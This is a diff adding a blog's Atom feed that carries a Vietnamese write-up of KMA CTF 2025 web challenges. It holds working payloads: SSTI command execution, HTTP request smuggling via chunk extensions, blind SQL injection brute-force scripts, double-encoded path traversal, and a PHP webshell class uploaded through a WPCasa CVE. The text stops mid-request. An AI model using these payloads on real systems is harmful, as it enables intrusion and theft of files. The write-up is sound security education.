@@ -1,0 +1,546 @@
+<?xml version="1.0" encoding="utf-8"?>
+        <feed xmlns="http://www.w3.org/2005/Atom">
+        <title>duc193 's Blog</title>
+        <subtitle>duc193</subtitle>
+        <link href="https://nduc193.github.io/" rel="alternate" type="text/html"/>
+        <link href="https://nduc193.github.io/atom.xml" rel="self" type="application/atom+xml"/>
+        <id>https://nduc193.github.io/</id>
+        <updated>2026-02-21T12:28:54.312Z</updated>
+        <language>en</language>
+        <entry>
+            <title>Writeup KMA CTF 2025</title>
+            <link href="https://nduc193.github.io/posts/kma_ctf_2025/" rel="alternate" type="text/html"/>
+            <id>https://nduc193.github.io/posts/kma_ctf_2025/</id>
+            <published>2025-09-29T00:00:00.000Z</published>
+            <updated>2025-09-29T00:00:00.000Z</updated>
+            <summary></summary>
+            <content type="html"><![CDATA[<h1>KMA CTF :</h1>
+<p>Writeup KMA CTF (Web exploitation)
+<img src="https://nduc193.github.io/assets/images/KMACTF/cover.png" alt="image" /></p>
+<h2>YDSYD :</h2>
+<p>Bài này server cho user <code>admin</code> có <code>isAdmin : true</code> sẵn rồi.
+Ở endpoint <code>/login</code> ko có sự filter nào về user <code>admin</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/1.png" alt="image" /></p>
+<p>Vậy chỉ cần login vào với user là <code>admin</code> là đã có token JWT và get flag thôi.</p>
+<pre><code>POST /login HTTP/2
+Host: ydsyd.wargame.vn
+Content-Type: application/json
+Content-Length: 16
+
+{"user":"admin"}
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/2.png" alt="image" /></p>
+<p>Và chỉ cần gắn cookie vào, POST tới <code>annyeong</code> là đã được flag :
+<img src="https://nduc193.github.io/assets/images/KMACTF/3.png" alt="image" /></p>
+<pre><code>POST /annyeong HTTP/2
+Host: ydsyd.wargame.vn
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NTkwNDMyMzAsImV4cCI6MTc1OTA0NjgzMH0.9Aeue-p_znn_7PGm7SOoPDqm1Ryq5Ds2z86GF-UtqJI
+Content-Type: application/json
+Content-Length: 2
+
+{}
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/4.png" alt="image" />
+FLAG : <code>KMACTF{Y1u__50lv3d_Y0u_L1ved??&lt;3}</code></p>
+<h2>ACL and H1 :</h2>
+<h3>Unintend :</h3>
+<p>Challenge này có vuln SSTI ở <code>/render</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/5.png" alt="image" /></p>
+<p>Nhận <code>filepath</code> sau đó sẽ read file và <code>render_template_string</code> với nội dung file.
+Và cho chúng ta upload file, nó sẽ random name sau đó save vào <code>uploads</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/6.png" alt="image" /></p>
+<p>Hàm <code>allow_file</code> sẽ check file coi có phải là <code>txt</code> hoặc <code>html</code> hay không.
+<img src="https://nduc193.github.io/assets/images/KMACTF/7.png" alt="image" /></p>
+<p>Và challenge này sử dụng <code>gunicorn</code> làm sv proxy.
+config :</p>
+<pre><code>map /render http://gunicorn-server:8088/internal @action=deny @method=post @method=get
+map / http://gunicorn-server:8088/
+</code></pre>
+<p>Thì nó sẽ chặn rq tới <code>/render</code> <code>http://gunicorn-server:8088/internal</code> với method post hoặc get.</p>
+<p>Thì <code>/render</code> chính là chỗ chúng ta cần truy cập để trigger <code>SSTI</code>
+Thì gunicorn có CVE<code> Http Requests Smuggling</code> nhưng ở biên bản thấp hơn, mà author sử dụng <code>gunicorn==23.0.0</code> nên phải tìm cách bypass khác.</p>
+<p>Để ý thì author dùng <code>map /render</code> Vậy sẽ ra sao khi chúng ta encode endpoint đó và gửi lên sv.
+Khi gửi rq bình thường :
+<img src="https://nduc193.github.io/assets/images/KMACTF/8.png" alt="image" />
+Encode :
+<img src="https://nduc193.github.io/assets/images/KMACTF/9.png" alt="image" /></p>
+<p>Vậy là đã truy cập được , bây giờ upload file chứa payload SSTI RCE để get flag thôi :</p>
+<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /*').read() }}
+</code></pre>
+<p>Sau khi upload thì đã được path :
+<img src="https://nduc193.github.io/assets/images/KMACTF/10.png" alt="image" />
+See all file :
+<img src="https://nduc193.github.io/assets/images/KMACTF/11.png" alt="image" />
+Render + url encoding :</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/12.png" alt="image" /></p>
+<p>Flag : <code>KMACTF{HTTP/1.1_Must_Di3_or_Not?????}</code></p>
+<h3>Intend :</h3>
+<p>https://w4ke.info/2025/06/18/funky-chunks.html</p>
+<p>Bài blog này phân tích cho chúng ta cách lợi dụng kí tự kết thúc dòng (<code>\r,\n</code>) để gây HTTP Requests Smuggling.
+Bài viết này phân tích 4 vector attack : <code>TERM.EXT</code>,<code>EXT.TERM</code>,<code>TERM.SPILL</code>,<code>SPILL.TERM</code> nhưng mà chủ yếu áp dụng <code>TERM.EXT</code> và <code>EXT.TERM</code>
+Đầu tiên để hiểu thì chúng ta cần tìm hiểu <code>Chunk extensions</code> trước.</p>
+<p>Trong <code>HTTP/1.1</code>, khi một rq được gửi với <code>Transfer-Encoding: chunked</code>, dữ liệu được chia thành nhiều <code>chunk</code>. Mỗi <code>chunk</code> có cú pháp như sau :</p>
+<pre><code>&lt;chunk-size&gt;[;&lt;chunk-extension&gt;]\r\n
+&lt;chunk-data&gt;\r\n
+</code></pre>
+<ul>
+<li><code>chunk-size</code> là độ dài dữ liệu, nó được tính theo hex</li>
+<li><code>chunk-data</code> là data.</li>
+<li><code>chunk-extension</code> là phần chunk mở rộng, nó ở sau dấu <code>;</code> (có hay không cũng được.)</li>
+</ul>
+<p><code>chunk-extension</code> có tác dụng cung cấp metadata cho chunk (signature hoặc hash)
+<img src="https://nduc193.github.io/assets/images/KMACTF/13.png" alt="image" /></p>
+<p>Và trong thực tế thì hầu như không có <code>server/client</code> nào sử dụng chúng. Các trình <code>parse</code> thường hay bỏ qua nó.</p>
+<p>:::note
+Vì <code>chunk-extension</code> không được sử dụng phổ biến và rộng rãi nên là các trình parse triển khai HTTP có thể sẽ không tuân thủ chuẩn về các quy tắc của nó. (Có thể gọi là làm cho có)
+:::</p>
+<p>Và chúng ta lợi dụng sự mơ hồ về parse <code>chunk-extension</code> để chèn các kí tự end line.</p>
+<p>Ví dụ chúng ta chèn <code>\n</code> vào bên trong <code>chunk-extension</code> thì trình parse sẽ có 3 lựa chọn :</p>
+<ul>
+<li>Bỏ qua <code>\n</code> và parse bình thường để tìm <code>\r\n</code> (terminator). Và nó đã vi phạm quy tắc RFC (Do kí tự này không được cho phép trong <code>chunk-extension</code> )</li>
+<li>Hiểu nó như một kí tự end line : Lúc này thì trình parse nó sẽ end cái <code>chunk-header</code> (<code>chunk-extension</code> nằm trong <code>header</code>) và bắt đầu parse <code>chunk-body</code></li>
+<li>Throw lỗi. Cách này là an toàn nhất.</li>
+</ul>
+<p>Vậy thì chúng ta cần lợi dụng lựa chọn 1 và 2 để Smuggling nếu proxy chọn cách 1 và server chọn cách 2 và ngược lại.</p>
+<h4>TERM.EXT (Terminator trong Extension)</h4>
+<p>Cách này là proxy hiểu là kí tự end line và server không hiểu.
+<img src="https://nduc193.github.io/assets/images/KMACTF/14.png" alt="image" />
+Chúng ta có thể thấy proxy nhận <code>\n</code> ở sau dấu <code>;</code> (chunk header) là dấu kết thúc dòng. Lúc này proxy sẽ parse <code>chunk body</code> và khi hết 2 byte kí tự thì xuống chunk header khai báo có <code>45</code> byte body -&gt; parse hết 45 byte rồi tìm <code>0\r\n</code> để end request TE.</p>
+<p>Còn bên server, server không nhận <code>\n</code> là kí tự kết thúc dòng. Sẽ đi tìm <code>\r\n</code> để kết thúc <code>chunk header</code>.
+Sau đó <code>45</code> sẽ là <code>chunk body</code>, <code>0\r\n\r\n</code> sẽ kết thúc requests của TE.</p>
+<p>Và request mới đã được tạo ra.</p>
+<h4>EXT.TERM :</h4>
+<p>Thì biến thể này ngược lại, proxy ko hiểu end line <code>\n</code> còn server lại hiểu.</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/15.png" alt="image" /></p>
+<p>Ta có thể thấy <code>chunk header</code> khai báo 45 byte (hex) và <code>;</code> để mở <code>chunk extension</code> , chèn <code>\n</code> vào , proxy không nhận và nó sẽ tìm <code>\r\n</code> chính thức để end <code>chunk header</code>.
+Sau đó <code>chunk body</code> sẽ được parse 45byte hex.</p>
+<p>Còn bên server, Nó hiểu <code>\n</code> là end line nên sẽ dừng <code>chunk header</code> sau đó <code>chunk body</code> sẽ kéo dài 45 byte hex và kết thúc với <code>0\r\n\r\n</code> và requests thứ 2 sẽ được tạo ra.</p>
+<h4>solve :</h4>
+<p>tác giả có bảo <code>gunicorn</code> có bị <code>TERM.EXT</code> nên là chúng ta có thể test bằng <code>TERM.EXT</code> (Lỗ hổng đã được biết đến và đang chờ fix.)
+<img src="https://nduc193.github.io/assets/images/KMACTF/16.png" alt="image" />
+Vì là <code>TERM.EXT</code> nên là proxy nhận <code>\n</code> là end line còn <code>server</code> ko nhận. Nên sẽ viết payload như sau :</p>
+<pre><code>GET / HTTP/1.1\r\n
+Host: localhost:8188\r\n
+Connection: keep-alive\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+2;\n
+cc\r\n
+54\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: localhost:8088\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/17.png" alt="image" />
+Check trong console của docker thì nó có báo <code>ERROR - 404 Error: Path '/admin' not found</code>
+Vậy là đã smugg thành công.
+<img src="https://nduc193.github.io/assets/images/KMACTF/18.png" alt="image" />
+Vì request smugg được server xử lí và chỉ response request <code>/</code> đầu tiên nên là tìm cách leak flag bằng OOB.
+Nhưng mà do server docker không có các command OOB đơn giản rồi nên là có thể dùng <code>route</code> này để read flag
+<img src="https://nduc193.github.io/assets/images/KMACTF/19.png" alt="image" />
+payload SSTI :</p>
+<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('mkdir /app/uploads/flag_ccmm &amp;&amp; cat /flag* &gt; /app/uploads/flag_ccmm/ccc.txt').read() }}
+</code></pre>
+<p>upload :
+<img src="https://nduc193.github.io/assets/images/KMACTF/20.png" alt="image" />
+<code>uploads/055a1dc947e94d49a55705f8634b84ec/5553a10c3dae4096.txt</code></p>
+<p>Smugg render :
+<img src="https://nduc193.github.io/assets/images/KMACTF/21.png" alt="image" />
+get flag :
+<img src="https://nduc193.github.io/assets/images/KMACTF/22.png" alt="image" /></p>
+<p>payload cho bạn nào muốn test :</p>
+<pre><code>GET / HTTP/1.1\r\n
+Host: 165.22.55.200:50001\r\n
+Connection: keep-alive\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+2;\n
+cc\r\n
+96\r\n
+0\r\n
+\r\n
+GET /render?filepath=uploads/055a1dc947e94d49a55705f8634b84ec/25ab8e8364d04222.txt HTTP/1.1\r\n
+Host: localhost:8088\r\n
+Transfer-Encoding: chunked \r\n
+\r\n
+0\r\n
+\r\n
+</code></pre>
+<p>Flag : <code>KMACTF{HTTP/1.1_Must_Di3_or_Not?????}</code></p>
+<h2>vibe_coding :</h2>
+<p>Challenge này có 2 service là <code>nodejs</code> và <code>python</code></p>
+<p>Service <code>python</code> chứa flag và được return khi call <code>process_action</code> với <code>username</code> là <code>admin</code> và <code>action</code> là <code>readFlag</code></p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/23.png" alt="image" /></p>
+<p>Ở endpoint <code>/execute</code> (Đã rút gọn code) Thì sẽ nhận POST tới và get <code>username</code>,<code>request_id </code>,<code>action</code> từ <code>request.form.get('...').strip()</code></p>
+<pre><code>@app.route('/execute', methods=['POST'])
+def execute_handler():
+    try:
+        username = request.form.get('username', '').strip()
+        request_id = request.form.get('requestid', '').strip()
+        action = request.form.get('action', '').strip()
+        
+        if not username or not request_id or not action:
+            return send_error_response(
+                "Missing required fields",
+                "username, requestid, and action are required",
+                400
+            )
+        
+            ...    
+        
+        return jsonify(response), 200
+        
+    except Exception as e:
+            ...
+</code></pre>
+<p>hàm <code>.strip()</code> sẽ xoá space ở đầu và ở cuối của <code>variable</code>.
+Service python chỉ cho phép local, ko mở port ra bên ngoài.
+<img src="https://nduc193.github.io/assets/images/KMACTF/24.png" alt="image" /></p>
+<p>Service <code>nodejs</code></p>
+<pre><code>app.post('/register', async (req, res) =&gt; {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({
+            error: 'Username and password are required'
+        });
+    }
+
+    if( typeof username !== 'string' || typeof password !== 'string' ) {
+        return res.status(400).json({
+            error: 'Username and password must be strings'
+        });
+    }
+
+    // Validate username length (must be &gt; 5 characters)
+    if (username.length &lt;= 5) {
+        return res.status(400).json({
+            error: 'Username must be longer than 5 characters'
+        });
+    }
+
+    if (users[username]) {
+        return res.status(400).json({
+            error: 'User already exists'
+        });
+    }
+
+    try {
+        const hashedPassword = await bcrypt.hash(password, 10);
+        users[username] = {
+            username,
+            password: hashedPassword,
+            createdAt: new Date().toISOString()
+        };
+
+        res.json({
+            message: 'User registered successfully',
+            username: username,
+            hint: 'Now you can login to get JWT token'
+        });
+    } catch (error) {
+        res.status(500).json({
+            error: 'Registration failed',
+            message: error.message
+        });
+    }
+});
+</code></pre>
+<p>Endpoint này cho register, check <code>users[username]</code> xem nếu có báo user đã tồn tại hoặc lỗi thì return <code>failed</code></p>
+<p>Còn <code>/action</code> sẽ get data từ requests của user. Sau đó sẽ gửi về server python <code>/execute</code> :
+<img src="https://nduc193.github.io/assets/images/KMACTF/25.png" alt="image" /></p>
+<p>Để ý thì <code>register, login</code> sẽ ở bên service nodejs. Còn khi action qua service của python thì nó sẽ nhận data và <code>.strip()</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/26.png" alt="image" />
+Ý tưởng :</p>
+<p>Chúng ta có thể lợi dụng điều này để reg username <code> admin       </code> (có space ở 2 đầu) để register và login.
+Sau đó khi server <code>nodejs</code> forward qua server <code>python</code> thì sẽ strip và chúng ta đã được user là <code>admin</code> trong requests tới <code>/execute</code>.</p>
+<p>Register :</p>
+<pre><code>POST /register HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 43
+
+{"username":"  admin ","password":"duc193"}
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/27.png" alt="image" /></p>
+<p>Login :</p>
+<pre><code>POST /login HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 43
+
+{"username":"  admin ","password":"duc193"}
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/28.png" alt="image" /></p>
+<p>Get flag :</p>
+<pre><code>POST /action HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Authorization: Beaber eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IiAgYWRtaW4gIiwiaWF0IjoxNzU5MDU4NjgxLCJleHAiOjE3NTkxNDUwODF9.YlixecXi8vByAOr-xZSGv7b1uXQD7lPldoGwvQRFHaM
+Content-Length: 21
+
+{"action":"readFlag"}
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/29.png" alt="image" />
+flag : <code>KMACTF{how_can_you_pollute_param_@@_}</code></p>
+<h2>Data Lost Prevention :</h2>
+<p>Challenge này cho chúng ta 1 trang web như sau :
+<img src="https://nduc193.github.io/assets/images/KMACTF/30.png" alt="image" /></p>
+<p>Để ý vào chức năng <code>search</code> và chức năng <code>export</code>.
+Đầu tiên thì phải xác định flag nằm ở đâu đã :
+<img src="https://nduc193.github.io/assets/images/KMACTF/31.png" alt="image" /></p>
+<p>Thì đoạn code này sẽ check coi trong <code>attachments</code> có <code>is_lost=1</code> trong db chưa, có r thì out. Chưa có thì sẽ gen <code>uuidv4</code> rename file flag và gắn vào path <code>/var/data/flags</code>.
+Sau đó sẽ add vào table <code>attachments</code> với <code>filename</code> là <code>Q2-incident-raw.csv</code> và <code>storage_path</code> là path tới file flag vừa gen.</p>
+<p><code>/api/search.php</code> :
+<img src="https://nduc193.github.io/assets/images/KMACTF/32.png" alt="image" /></p>
+<p>Đoạn này có dính vuln SQL Injection do chèn <code>$filtered</code> vào payload sql. Dù đã qua filter nhưng vẫn k an toàn.</p>
+<ul>
+<li><code>$q2 = preg_replace('/\s+/u', '', $q);</code> đoạn này sẽ filter và replace các khoảng trắng. Bao gồm <code>space,tab,\n,...</code></li>
+<li><code>$q2 = preg_replace('/\b(?:or|and)\b/i', '', $q2);</code> dòng này sẽ replace <code>or</code> và <code>and</code> (không phân biệt viết hoa hay thường.). Lưu ý là do có <code>\b</code> nên là chỉ có <code>or</code> hoặc <code>and</code> đứng một mình mới bị replace. Nên là ko thể bypass bằng cách dùng <code>oorr</code> hay <code>anandd</code>. Nhưng mà có thể dùng <code>||</code>,<code>&amp;&amp;</code> thay cho <code>or</code> và <code>and</code>.</li>
+<li><code>$q2 = str_ireplace(["union","load_file","outfile","="], '', $q2);</code> Hàm này chỉ đơn giảnn là replace các kí tự nếu có trong chuỗi (Ko phân biệt Hoa, thường).
+Và lưu ý là chuỗi sau khi replace xong sẽ được check <code>strlen</code> dưới 90 kí tự mới cho phép query</li>
+</ul>
+<p>Đây là payload gốc :</p>
+<pre><code>$sql = "SELECT id,title FROM cases WHERE title RLIKE '.*$filtered' AND owner_id = :uid LIMIT 1";
+</code></pre>
+<p>Thì chỉ trả về json <code>(bool)$row</code> nên chúng ta cần query blind boolean để trả về row hoặc ko.
+Vậy cần payload ngắn mà đáp ứng được điều kiện trên :
+Sau một hồi fuzz thử thì được payload như sau :</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/33.png" alt="image" /></p>
+<p>payload :</p>
+<pre><code>-'union select 1,1 FROM(attachments)where substr(storage_path,1,1)like'/'#
+</code></pre>
+<p>(<code>-'</code> để làm cho nó return sai vế trước.)
+Sau đó dùng union để select 2 row và get <code>storage_path</code> từ <code>attachments</code>, sau đó substring để bruteforce từng kí tự.</p>
+<p>Bypass filter :</p>
+<ul>
+<li>Vì union bị filter nên có thể chèn <code>unio=n</code> để khi nó replace <code>=</code> sẽ còn chuỗi <code>union</code>.</li>
+<li>Bypass filter space bằng <code>/**/</code></li>
+<li>Đoạn <code>FROM(attachments)</code> thì dùng cách này để khỏi phải dùng <code>/**/FROM/**/attachments/**/</code> để payload ngắn hơn.</li>
+<li>Đoạn <code>substring(storage_path,1,1)like'/'#</code> viết liền để hạn chế dùng space (Nhưng mà nó vẫn chạy được.)</li>
+</ul>
+<p>Thay <code>/**/</code> vào payload :</p>
+<pre><code>-'union/**/select/**/1,1/**/FROM(attachments)where/**/substr(storage_path,1,1)like'/'#
+</code></pre>
+<p>Được payload 86 kí tự, hợp lí rồi.
+Script Brute tên file :</p>
+<pre><code>import requests
+base_url = "https://dlp.wargame.vn/api/search.php?q="
+cookies = {"PHPSESSID": "d005006fea64b1d184298adaaf03502e"}
+headers = {"Connection": "keep-alive"}
+file = "/var/data/flags/flag_2986112"
+# Cho _ ở cuối bởi vì chúng ta dùng LIKE nó sẽ luôn true khi có _ (Có thể dùng để check length)
+# Nhưng mà do name flag không có `_` nên là thôi bỏ cũng được.
+CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}_"
+def gen_payload(index,ch):
+    sql  = f"-'uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like'{ch}'%23"
+    return sql
+for i in range(27,100):
+    for ch in CHARSET:
+        payload = gen_payload(i,ch)
+        url = base_url + payload
+        a = requests.get(url)
+        if "true" in a.text:
+            file += ch
+            break
+    print(file)
+</code></pre>
+<p>Do trên server hơi lag nên GPT để script đa luồng cho nhanh :</p>
+<pre><code>import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import time
+
+base_url = "https://dlp.wargame.vn/api/search.php?q="
+cookies = {"PHPSESSID": "d005006fea64b1d184298adaaf03502e"}
+headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (ctf-bruter)"}
+CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}"
+
+file_path = ""
+
+MAX_WORKERS = 10
+REQUEST_TIMEOUT = 8
+RETRY = 2
+SLEEP_BETWEEN_INDEX = 0.05
+
+def gen_payload(index, ch):
+    sql  = f"-'uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like'{ch}'%23"
+    return sql
+
+def probe_char(session: requests.Session, index: int, ch: str) -&gt; bool:
+    url = base_url + gen_payload(index, ch)
+    tries = 0
+    while tries &lt;= RETRY:
+        try:
+            r = session.get(url, cookies=cookies, headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=False)
+            if "true" in r.text:
+                return True
+            return False
+        except requests.RequestException:
+            tries += 1
+            time.sleep(0.2)
+    return False
+
+def find_char_at_index(session: requests.Session, index: int) -&gt; str | None:
+    found_event = threading.Event()
+    found_char = None
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = {executor.submit(probe_char, session, index, ch): ch for ch in CHARSET}
+
+        try:
+            for fut in as_completed(futures):
+                ch = futures[fut]
+                try:
+                    ok = fut.result()
+                except Exception:
+                    ok = False
+                if ok:
+                    found_char = ch
+                    found_event.set()
+                    break
+        finally:
+            pass
+
+    return found_char
+
+def main():
+    global file_path
+    start = 1
+    end = 100
+
+    with requests.Session() as session:
+        for i in range(start, end):
+            ch = find_char_at_index(session, i)
+            if ch is None:
+                print(f"[{i}] No char found -&gt; stopping.")
+                break
+            file_path += ch
+            print(f"[{i}] found: {ch} -&gt; {file_path}")
+            time.sleep(SLEEP_BETWEEN_INDEX)
+
+    print("Done. Final:", file_path)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>Nhớ thay cookie vào chạy chứ không bị lỗi.
+Được tên flag :
+<img src="https://nduc193.github.io/assets/images/KMACTF/34.png" alt="image" /></p>
+<p><code>/var/data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt</code></p>
+<p>Bên <code>export.php</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/35.png" alt="image" />
+Thì sẽ check while nếu có <code>../</code> sẽ replace thành <code>""</code>
+(Không thể dùng <code>..././</code>) vì nó có đệ quy)
+Để ý thì nó có <code>urldecode</code> nên chúng ta có thể encoding 2 lần gửi lên để bypass qua filter.
+2 lần do 1 lần server tự decode, lần thứ 2 là do code.</p>
+<p>path traversal về :</p>
+<p><code>../../data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt</code>
+double url encode :
+<code>..%252f..%252fdata%252fflags%252fflag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt</code></p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/36.png" alt="image" />
+Flag :
+<code>KMACTF{i'M_bL1nd_bUt_u_'r3_Sm4rZZZZ}</code></p>
+<h2>CVE-2025-93XX :</h2>
+<p>Challenge này author cho chúng ta 1 file WordPress :
+Sau khi dựng local lên thì vào page admin.
+Thì challenge WP thường đa số sẽ target vào plugin WP. Nên là check thử Plugin trong <code>wp-admin</code> :
+(Ở đây mình tự active 2 plugin)
+<img src="https://nduc193.github.io/assets/images/KMACTF/37.png" alt="image" />
+Vậy là có 2 plugin là <code>Safe PHP Class Upload (read-only, non-executable)</code> version <code>0.1</code> (author <code>meulody</code> tên author challenge này ) và <code>WPCasa</code> version <code>1.4.1 </code></p>
+<p>Khi search thử thì thấy có CVE của <code>wpcasa</code>
+https://zeropath.com/blog/cve-2025-9321-wpcasa-wordpress-plugin-code-injection-summary</p>
+<p><code>CVE 2025-9321</code>
+Tóm tắt thì plugin <code>WPCasa</code> có chứa lỗ hổng <code>Code Injection</code> cho phép attacker call hàm <code>api_requests</code> nằm ở file <code>includes/class-wpsight-api.php</code> và có thể dẫn tới RCE. Do không <code>WhiteList</code>, <code>filter blacklist</code> input nên dẫn tới việc attacker có thể tấn công vào và RCE.</p>
+<p>Vì CVE này mới ra được 6 ngày nên chưa có PoC (1day).
+<img src="https://nduc193.github.io/assets/images/KMACTF/38.png" alt="image" /></p>
+<p>Mở thử file đó lên xem như nào đã :
+Khi khởi tạo class nó sẽ chạy <code>__construct()</code></p>
+<ul>
+<li><code>add_filter( 'query_vars', array( $this, 'add_query_vars'), 0 );</code> : thêm biến query <code>wpsight-api</code> vào danh sách <code>query_vars</code> của <code>WordPress</code>.</li>
+<li><code>add_action( 'parse_request', array( $this, 'api_requests'), 0 );</code> : Hook vào quá trình parse request để xử lý khi có request tới endpoint API.</li>
+<li><code>function add_query_vars( $vars )</code> : Mở rộng query vars của <code>WordPress</code> để chấp nhận tham số <code>?wpsight-api=...</code> trên URL.</li>
+</ul>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/39.png" alt="image" />
+Hàm <code>api_requests</code> sẽ có flow như sau :</p>
+<ul>
+<li>Nếu tồn tại <code>$_GET['wpsight-api']</code> → gán vào <code>$wp-&gt;query_vars['wc-api']</code>.</li>
+<li>Sau đó check nếu có <code>$wp-&gt;query_vars['wc-api']</code> sẽ <code>ob_start()</code> Hàm này sẽ không cho script nếu được chạy in ra output ra ngoài. Đây là lí do tại sao khi gọi echo nó không in ra.</li>
+<li>Tiếp tục sẽ gắn <code>$api</code> từ <code>wpsight-api</code> <code>lowercase</code>. Sau đó nếu tồn tại class thì khởi tạo class đó. với <code>new $api()</code></li>
+</ul>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/40.png" alt="image" /></p>
+<p>Ban đầu thì ý tưởng là tìm sink để RCE nhưng mà không được, do chỉ cho mỗi reg new Class, không cho truyền j vào.
+Sau thì nghĩ lại thấy plugin upload của author :
+<img src="https://nduc193.github.io/assets/images/KMACTF/41.png" alt="image" />
+Đầu tiên sẽ khởi tạo và <code>add_action('rest_api_init', function ()</code> để nhận rq post tới.
+<img src="https://nduc193.github.io/assets/images/KMACTF/42.png" alt="image" /></p>
+<p>flow sẽ như sau :
+Nhận file -&gt; check coi nếu file có size &gt; 64 byte thì throw lỗi. -&gt; read file và check phải có <code>Class ...</code> -&gt; sau đó sẽ check xem chúng ta có sử dụng hàm bị cấm không.</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/43.png" alt="image" /></p>
+<p>Rồi mới save vào file <code>.txt</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/44.png" alt="image" />
+Câu hỏi đặt ra là save vào file txt thì làm sao mà dùng Class này để có thể trigger CVE được.</p>
+<p>Để tìm hiểu rõ hơn thì CTRL SHIFT F <code>uploads_safe_classes</code>
+<img src="https://nduc193.github.io/assets/images/KMACTF/45.png" alt="image" />
+Và chúng ta đã tìm thấy author đã sửa đoạn code này để <code>include</code> file txt vào.
+<img src="https://nduc193.github.io/assets/images/KMACTF/46.png" alt="image" /></p>
+<p>Và đoạn code này nằm trong hàm <code>__construct</code> của class <code>WPSight_Framework</code>
+Lệnh <code>wpsight();</code> ở cuối file được gọi mỗi lần <code>WordPress</code> load plugin này.
+Trong function đó, nếu biến global <code>$wpsight</code> chưa tồn tại, nó sẽ <code>new WPSight_Framework()</code> và sẽ làm load <code>constructor</code>.</p>
+<p>:::note
+Mà mỗi lần truy cập web thì <code>wp</code> sẽ <code>load plugin</code> cho chúng ta, vậy chúng ta có thể coi như server luôn trigger <code>include</code> file txt.
+:::
+<img src="https://nduc193.github.io/assets/images/KMACTF/47.png" alt="image" /></p>
+<p>Vậy thì upload sẽ ở <code>endpoint</code> nào :
+<img src="https://nduc193.github.io/assets/images/KMACTF/48.png" alt="image" />
+Thì nó sẽ <code>add_action</code> vào <code>rest_api_init</code> nên là mình tìm thấy docs :
+https://developer.wordpress.org/rest-api/extending-the-rest-api/adding-custom-endpoints/</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/49.png" alt="image" /></p>
+<p>Vậy là chúng ta có thể gọi upload bằng query :
+<code>?rest_route=/safe-upload/v1/upload</code></p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/50.png" alt="image" /></p>
+<p>Upload thành công.</p>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/51.png" alt="image" /></p>
+<p>Vậy giờ tìm cách để rce, bypass filter và size 64byte.</p>
+<p>Thì trong magic method của PHP có function magic method <code>__construct</code> là hàm sẽ được chạy khi chúng ta khởi tạo 1 object.</p>
+<p>Vậy thì chúng ta có thể lợi dung nó với cách gọi hàm <code>$a($b)</code> để RCE. (Dùng payload này là do nó ngắn để ko bị dính quá 64 kí tự) hoặc có thể dùng include($_GET[1]) và kết hợp với php filter chain.</p>
+<p>Ví dụ :
+<img src="https://nduc193.github.io/assets/images/KMACTF/52.png" alt="image" /></p>
+<p>Và để control thì chúng ta có thể dùng <code>$_GET[1]($_GET[2])</code> để truyền tham số vào bằng requests.</p>
+<p>payload :</p>
+<pre><code>&lt;?php class cc{function __construct(){$_GET[1]($_GET[2]);}}
+</code></pre>
+<p>upload :</p>
+<pre><code>curl -X POST "http://localhost:8082/?rest_route=/safe-upload/v1/upload" -F "file=@123.txt"
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/53.png" alt="image" /></p>
+<pre><code>GET /?wpsight-api=cc&amp;1=system&amp;2=ls HTTP/1.1
